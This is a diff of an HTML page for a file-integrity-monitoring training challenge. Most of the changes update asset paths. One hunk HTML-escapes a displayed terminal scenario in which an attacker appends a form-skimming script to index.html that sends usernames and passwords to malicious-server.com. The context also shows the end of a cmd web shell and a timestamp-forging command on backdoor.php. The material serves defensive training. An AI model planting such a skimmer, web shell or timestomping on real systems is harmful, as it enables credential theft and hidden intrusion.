@@ -5,14 +5,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>File Integrity Monitoring Challenge - Aziz Alghamdi</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="/Interactive_Section/css/fim-challenge.css">
+    <link rel="stylesheet" href="../../assets/vendor/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="../../assets/css/site.css">
+    <link rel="stylesheet" href="../css/fim-challenge.css">
+    <link rel="stylesheet" href="../../assets/css/lab-theme.css">
+    <script src="../../assets/js/site.js" defer></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
 </head>
 
-<body>
+<body data-lab="fim-challenge">
 <!-- Header -->
 <header>
     <div class="container">
@@ -651,17 +654,17 @@ if(isset(\$_REQUEST['cmd'])) {
 ?>
 EOL"</span></div>
                                 <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo cat >> /var/www/html/index.html << 'EOL'
-<script>
+&lt;script&gt;
 document.addEventListener('DOMContentLoaded', function () {
     // Hidden code to steal login credentials
     document.querySelector('form').addEventListener('submit', function (e) {
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
         var img = new Image();
-        img.src = 'https://malicious-server.com/collect.php?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password);
+        img.src = 'https://malicious-server.com/collect.php?u=' + encodeURIComponent(username) + '&amp;p=' + encodeURIComponent(password);
     });
 });
-</script>
+&lt;/script&gt;
 EOL</span></div>
                                 <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo touch -a -m -t 202504010800 /var/www/html/backdoor.php</span>
                                 </div>
@@ -1213,8 +1216,7 @@ if(isset($_REQUEST['cmd'])) {
 </footer>
 
 <!-- JavaScript -->
-<script src="/Interactive_Section/javascript/fim-challenge.js"></script>
-<script src="/Interactive_Section/javascript/cyber-vis.js"></script>
+<script src="../javascript/fim-challenge.js"></script>
 </body>
 
 </html>
